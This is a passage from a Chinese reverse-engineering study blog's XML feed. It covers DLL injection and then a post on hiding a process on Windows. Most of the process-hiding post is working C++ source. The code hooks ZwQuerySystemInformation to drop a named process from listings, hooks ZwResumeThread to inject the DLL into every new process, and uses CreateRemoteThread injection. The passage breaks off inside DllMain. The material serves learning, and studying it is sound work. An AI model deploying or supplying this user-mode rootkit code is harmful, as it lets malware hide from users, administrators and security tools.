class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">inject</span>((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>]))</span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s success!\n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;inject %s failed! \n&quot;</span>), argv[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2025/02/27/ExOAXnoB3Lyhp2d.png" alt="image-20250227181313876"></p><p>可以看到进程查看器中显示已经注入成功</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 技能 </category>
          
          <category> DLL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》0B-进程隐藏</title>
      <link href="/posts/88758528.html"/>
      <url>/posts/88758528.html</url>
      
        <content type="html"><![CDATA[<h2 id="原理">原理</h2><p>每个进程可以通过ZwQuerySystemInformation API函数获取运行中所有有关进程的结构体链表，<br>通过Hook其它所有进程的ZwQuerySystemInformation API，使其在返回前先删掉想要隐藏进程的结构体，从而实现隐藏进程</p><p>但是如果只有这样，那么后创建的进程依然能识别到，所以除了直接hook ZwQuerySystemInformation ，还要hook创建进程的函数，这里选择的是ZwResumeThread api，通过hook这个api，任何一个进程在执行它时先执行hook新进程的ZwQuerySystemInformation 实现新进程也被hook的效果。</p><h2 id="具体流程">具体流程</h2><p>写一个dll，效果是</p><ul><li>hook本进程的ZwQuerySystemInformation函数，隐藏结构体</li><li>hook本进程的ZwResumeThread函数，注入这个DLL</li></ul><p>写一个全进程注入器，把这个dll注入所有进程</p><p>隐藏结构体的方式是</p><p>NtQuerySystemInformation函数在SystemInformationClass参数为5时会在SystemInformation返回PSYSTEM_PROCESS_INFORMATION型结构体链表头，每个结构体都保存了一个当前正在运行的进程，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_PROCESS_INFORMATION</span> &#123;</span></span><br><span class="line">    ULONG NextEntryOffset;</span><br><span class="line">    ULONG NumberOfThreads;</span><br><span class="line">    BYTE Reserved1[<span class="number">48</span>];</span><br><span class="line">    UNICODE_STRING ImageName;</span><br><span class="line">    KPRIORITY BasePriority;</span><br><span class="line">    HANDLE UniqueProcessId;</span><br><span class="line">    PVOID Reserved2;</span><br><span class="line">    ULONG HandleCount;</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    SIZE_T PeakVirtualSize;</span><br><span class="line">    SIZE_T VirtualSize;</span><br><span class="line">    ULONG Reserved4;</span><br><span class="line">    SIZE_T PeakWorkingSetSize;</span><br><span class="line">    SIZE_T WorkingSetSize;</span><br><span class="line">    PVOID Reserved5;</span><br><span class="line">    SIZE_T QuotaPagedPoolUsage;</span><br><span class="line">    PVOID Reserved6;</span><br><span class="line">    SIZE_T QuotaNonPagedPoolUsage;</span><br><span class="line">    SIZE_T PagefileUsage;</span><br><span class="line">    SIZE_T PeakPagefileUsage;</span><br><span class="line">    SIZE_T PrivatePageCount;</span><br><span class="line">    LARGE_INTEGER Reserved7[<span class="number">6</span>];</span><br><span class="line">&#125; SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;</span><br></pre></td></tr></table></figure><p>其中ImageName.buffer为wchar_t类型的进程名，NextEntryOffset为和下一个结构体节点相差的字节数，通过这个来连接，如果为0说明没有后继节点，只要通过这个把想要隐藏的隐藏掉即可</p><p>第二点，勾取ZwResumeThread时，应该先注入后恢复，同时注意注入时并不是在新线程内部注入，而是作为父进程远程线程注入</p><h2 id="实现">实现</h2><p>dll代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/SECTION:.SHARED,RWS&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg(<span class="string">&quot;.SHARE&quot;</span>)</span></span><br><span class="line">TCHAR g_szProcName[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">setProcName</span><span class="params">(LPCTSTR szProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_tcscpy_s(g_szProcName, szProcName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//PZwQuerySystemInformation</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A70  mov         r10, rcx</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A73  mov         eax, 36h</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A78  test        byte ptr[7FFE0308h], 1</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A80  jne         00007FFBF7E50A85</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A82  syscall</span></span><br><span class="line"><span class="comment">//00007FFBF7E50A84  ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BYTE orgBytesA[<span class="number">14</span>];</span><br><span class="line">BYTE orgBytesB[<span class="number">14</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* PZwResumeThread)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_THREAD_BASIC_INFORMATION</span> &#123;</span><br><span class="line">NTSTATUS ExitStatus;</span><br><span class="line">PVOID TebBaseAddress;</span><br><span class="line">CLIENT_ID ClientId;</span><br><span class="line">KAFFINITY AffinityMask;</span><br><span class="line">KPRIORITY Priority;</span><br><span class="line">KPRIORITY BasePriority;</span><br><span class="line">&#125; THREAD_BASIC_INFORMATION;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">FARPROC <span class="title">getProc</span><span class="params">(std::string moduleName, std::string processName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(moduleName.<span class="built_in">c_str</span>()), processName.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hookByCode</span><span class="params">(std::string moduleName, std::string processName, PROC pFuncNew, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BYTE jmpcode[<span class="number">14</span>] = &#123; <span class="number">0xff</span>,<span class="number">0x25</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"><span class="keyword">if</span> (pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//保存原始代码</span></span><br><span class="line"><span class="built_in">memcpy</span>(orgBytes, pOrgFunc, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//8BYTE跳转为绝对地址</span></span><br><span class="line">DWORD64 targetAddr = <span class="built_in">reinterpret_cast</span>&lt;DWORD64&gt;(pFuncNew);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(&amp;jmpcode[<span class="number">6</span>], &amp;targetAddr, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, jmpcode, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">unhookByCode</span><span class="params">(std::string moduleName, std::string processName, PBYTE orgBytes)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">FARPROC orgFunc = <span class="built_in">getProc</span>(moduleName, processName);</span><br><span class="line">PBYTE pOrgFunc = <span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(orgFunc);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(pOrgFunc[<span class="number">0</span>] == <span class="number">0xff</span> &amp;&amp; pOrgFunc[<span class="number">1</span>] == <span class="number">0x25</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(pOrgFunc, orgBytes, <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">VirtualProtect</span>(pOrgFunc, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;NtQuerySystemInformation&quot;</span>, &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line">PZwQuerySystemInformation pZwQuerySystemInformation = <span class="built_in">reinterpret_cast</span>&lt;PZwQuerySystemInformation&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);</span><br><span class="line"><span class="keyword">if</span> (status != STATUS_SUCCESS)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> end;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (SystemInformationClass == <span class="number">5</span> &amp;&amp; g_szProcName[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pInfo = <span class="built_in">static_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(SystemInformation);</span><br><span class="line">PSYSTEM_PROCESS_INFORMATION pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line"><span class="keyword">while</span> (pNextInfo-&gt;NextEntryOffset)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!_tcsicmp(pNextInfo-&gt;ImageName.Buffer, g_szProcName))</span><br><span class="line">&#123;</span><br><span class="line">pInfo-&gt;NextEntryOffset += pNextInfo-&gt;NextEntryOffset;</span><br><span class="line">&#125;</span><br><span class="line">pInfo = pNextInfo;</span><br><span class="line">pNextInfo = <span class="built_in">reinterpret_cast</span>&lt;PSYSTEM_PROCESS_INFORMATION&gt;(<span class="built_in">reinterpret_cast</span>&lt;PBYTE&gt;(pInfo) + pInfo-&gt;NextEntryOffset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end:</span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQuerySystemInformation&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwQuerySystemInformation), &amp;orgBytesA[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; <span class="comment">// 取得对应 PID 句柄</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;Open process %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line"></span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;Memory allocation failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;WriteProcessMemory failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HMODULE hKernel32 = <span class="built_in">GetModuleHandle</span>(_T(<span class="string">&quot;kernel32.dll&quot;</span>));</span><br><span class="line"><span class="keyword">if</span> (hKernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetModuleHandle failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(hKernel32, <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (pThreadProc == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;GetProcAddress failed\n&quot;));</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, pThreadProc, pBuf, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;CreateRemoteThread failed in process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">1500</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">VirtualFreeEx</span>(hProcess, pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="comment">//_tprintf(_T(&quot;DLL injected successfully into process %d\n&quot;), dwPID);</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">myZwResumeThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE threadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG SuspendCount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* ZwQueryInformationThread_t)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD ThreadInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID ThreadInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG ThreadInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength OPTIONAL</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line">THREAD_BASIC_INFORMATION tbi;</span><br><span class="line">FARPROC pqit = <span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwQueryInformationThread&quot;</span>);</span><br><span class="line">NTSTATUS statusThread = <span class="built_in">reinterpret_cast</span>&lt;ZwQueryInformationThread_t&gt;(pqit)(threadHandle, <span class="number">0</span>, &amp;tbi, <span class="built_in">sizeof</span>(tbi), <span class="literal">NULL</span>);</span><br><span class="line">DWORD dwPid = <span class="built_in">reinterpret_cast</span>&lt;DWORD&gt;(tbi.ClientId.UniqueProcess);</span><br><span class="line">DWORD dwPrevPid = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (dwPid != <span class="built_in">GetCurrentProcessId</span>() &amp;&amp; dwPid != dwPrevPid)</span><br><span class="line">&#123;</span><br><span class="line">dwPrevPid = dwPid;</span><br><span class="line"><span class="built_in">inject</span>(dwPid, <span class="string">L&quot;C:\\Users\\a2879\\source\\repos\\HideProcess\\x64\\Debug\\HideProcess.dll&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">unhookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line">PZwResumeThread pZwResumeThread = <span class="built_in">reinterpret_cast</span>&lt;PZwResumeThread&gt;(<span class="built_in">getProc</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>));</span><br><span class="line">NTSTATUS status = <span class="built_in">pZwResumeThread</span>(threadHandle, SuspendCount);</span><br><span class="line"></span><br><span class="line"><span class="built_in">hookByCode</span>(<span class="string">&quot;ntdll.dll&quot;</span>, <span class="string">&quot;ZwResumeThread&quot;</span>, <span class="built_in">reinterpret_cast</span>&lt;PROC&gt;(myZwResumeThread), &amp;orgBytesB[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">return</span> status;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID 